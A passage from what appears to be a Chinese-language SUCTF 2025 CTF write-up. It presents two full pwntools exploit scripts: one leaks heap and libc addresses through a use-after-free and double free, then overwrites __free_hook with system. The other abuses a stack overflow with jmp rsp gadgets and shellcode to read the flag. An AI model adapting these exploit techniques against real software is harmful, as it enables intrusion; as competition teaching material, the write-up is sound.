dispatch([cmdVisit(b'', b'')])
```

这里笔者猜测可能是`vector_Config_end`​ 和`vector_config`​ 指向两个内容相同的管理堆块，delete只清空了`vector_config`​ 而`vector_Config_end`​ 不变，所以会有UAF。

如果再加一个`dispatch([cmdUpdate(b'', b"geek")])`​就会double free

~~纯靠猜的，本来是想看看updata会不会可以编辑这个释放过的chunk，没想到直接double free了~~

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-50.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-50" position="center" style="border-radius: 1px;" >}}

那么就申请对应大小的tcache，申请完tcache后就会将fastbin链入tcache，打\_\_free\_hook即可：

```Python
from pwn import *
context.arch='amd64'
context.log_level='debug'
filename = "main"
libcname = "./libc-2.31.so"
host = "1.95.34.240"
port =  10000
elf = context.binary = ELF(filename)
if libcname:
   libc=ELF(libcname,checksec=False)
gs='''
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REMOTE:
        return remote(host,port)
    else:
        return process(elf.path)
context.terminal=["tilix","-a","session-add-right","-e"]
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
    gdb.attach(p,gdbscript=gs)
    pause()
p = start()
def config_cmd(t2, name, content, last_byte):
    return p32(t2) + p32(len(name)) + name + p32(len(content)) + content + p8(last_byte)

def full_payload(t1, key, config_cmd_list):
    return p32(t1) + p32(key) + p32(len(config_cmd_list)) + b''.join(config_cmd_list)


def cmd(t1, key, payload):
    p.sendlineafter(b'Enter command: ', full_payload(t1, key, payload))


def dispatch(config_cmd_list, local = True):
    if local:
        cmd(1, 65, config_cmd_list)
    else:
        cmd(1, 97, config_cmd_list)


def cmdGet(name, content, flag = 0):
    return config_cmd(0, name, content, flag)


def cmdAdd(name, content, flag = 0):
    return config_cmd(1, name, content, flag)

def cmdUpdate(name, content, flag = 0):
    return config_cmd(2, name, content, flag)

def cmdDelete(name, content, flag = 0):
    return config_cmd(3, name, content, flag)

def cmdVisit(name, content, flag = 0):
    return config_cmd(4, name, content, flag)


dispatch([cmdAdd(b'chuwei0'.ljust(0x30,b"a"), b'A'*0x30,1)])
dispatch([cmdAdd(b'chuwei1'.ljust(0x30,b"b"), b'B'*0x30,1)])
dispatch([cmdAdd(b'chuwei2'.ljust(0x30,b"c"), b'C'*0x30,1)])
dispatch([cmdAdd(b'chuwei3'.ljust(0x30,b"d"), b'D'*0x30,1)])
dispatch([cmdAdd(b'chuwei4'.ljust(0x30,b"e"), b'E'*0x30,1)])
dispatch([cmdDelete(b'chuwei4'.ljust(0x30,b"e"), b'')])
dispatch([cmdDelete(b'chuwei3'.ljust(0x30,b"d"), b'')])
dispatch([cmdDelete(b'chuwei2'.ljust(0x30,b"c"), b'')])
dispatch([cmdDelete(b'chuwei1'.ljust(0x30,b"b"), b'')])
dispatch([cmdVisit(b'', b'')])
ru("Content: ")
heap_base=u64(rn(6).ljust(8,b"\x00"))-0x12490
dispatch([cmdDelete(b'chuwei0'.ljust(0x30,b"a"), b'')])
dispatch([cmdAdd(b'geekcmore0'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore1'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore2'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore3'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore4'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore5'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore6'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore7'.ljust(0xf0,b"a"), b'a'*0xf0,0)])
dispatch([cmdAdd(b'geekcmore8'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdAdd(b'geekcmore9'.ljust(0xf0,b"a"), b'a'*0xf0,1)])
dispatch([cmdDelete(b'geekcmore9'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore8'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore7'.ljust(0xf0,b"a"), b'')])
dispatch([cmdVisit(b'', b'')])

ru("Content: ")
libc_base=u64(rn(6).ljust(8,b"\x00"))-0x1ecbe0
dispatch([cmdDelete(b'geekcmore6'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore5'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore4'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore3'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore2'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore1'.ljust(0xf0,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore0'.ljust(0xf0,b"a"), b'')])
lg("heap_base")
lg("libc_base")

dispatch([cmdAdd(b'geekcmore0'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore1'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore2'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore3'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore4'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore5'.ljust(0x20,b"a"), b'a'*0x20,1)])


dispatch([cmdDelete(b'geekcmore5'.ljust(0x20,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore4'.ljust(0x20,b"a"), b'')])
dispatch([cmdVisit(b'', b'')])
# 


dispatch([cmdUpdate(b'', b"geek")])
dispatch([cmdAdd(b'geek0', b'a'*0x20)])
dispatch([cmdAdd(b'geek1', b'b'*0x20)])
dispatch([cmdAdd(b'geek2', b'c'*0x20)])
dispatch([cmdAdd(b'geek3', b'd'*0x20)])
dispatch([cmdAdd(b'geek4', p64(libc_base+libc.sym['__free_hook'])+p64(1)*3)])
dispatch([cmdAdd(b'geek5', b'f'*0x20)])
dispatch([cmdAdd(b'geek6', b'h'*0x20)])
# gdb.attach(p,api=True,gdbscript="""
# b *$rebase(0x3AA5)
# """)
dispatch([cmdAdd(b'/bin/sh', p64(libc_base+libc.sym['system'])+b"a"*0x18)])

p.interactive()
```

### SU\_BABY

栈溢出控制一下可以绕过canary，可以劫持返回地址到attack

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-59.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-59" position="center" style="border-radius: 1px;" >}}

用jmp\_rsp结合add\_rsp控制执行栈上的shellcode即可：

```Python
from pwn import *


context(arch='amd64',os='linux')
context.log_level='debug'
# context.terminal=["tilix","-a","session-add-right","-e"]
file="./ASU1"
elf=ELF(file)
# io=process(file)
io=remote("1.95.76.73",10000)
bss=0x605000+0x100
def s(data):
    io.recvuntil('请输入文件名称'.encode())
    io.sendline(b'aaa')
    io.recvuntil('请输入文件内容'.encode())
    io.send(data)
attack=0x0400F56
io.recvuntil('+++++++++++++++++++++++++++++++++++++++++++++'.encode())
io.sendline(b'8')
io.recvuntil('需要添加几组模拟文件数据:'.encode())
io.sendline(b'6')

s(b'a'*2+b'\x00') 
s(b'b'*8)

sc="""
syscall
lea rsi,[rsp]
syscall
"""
s(asm(sc)) 
s(b'd'*7) 
s(b'e'*7+b'\x00')
s(p64(attack)+b'\x00')
 

io.recvuntil("Good opportunity")
#0x000000000040327f: jmp rsp; 
io.send(p64(0x000000000040327f)+asm("push rbx")+asm("pop rsi")+asm("xor edi,edi"))
io.recvuntil("What do you want to do?")
#0x0000000000401931: add rsp, 0x38; pop rbx; pop rbp; ret;
io.send(p64(0x0000000000401931)+b"\x00")

sc="""
mov rax,0
mov rdi,3
mov rsi,r9
mov rdx,0x50
syscall
mov rax,1
mov rdi,1
syscall
"""
io.send(b"\x90"*0xa+asm(shellcraft.open("flag",0))+asm(sc))
io.interactive()
```
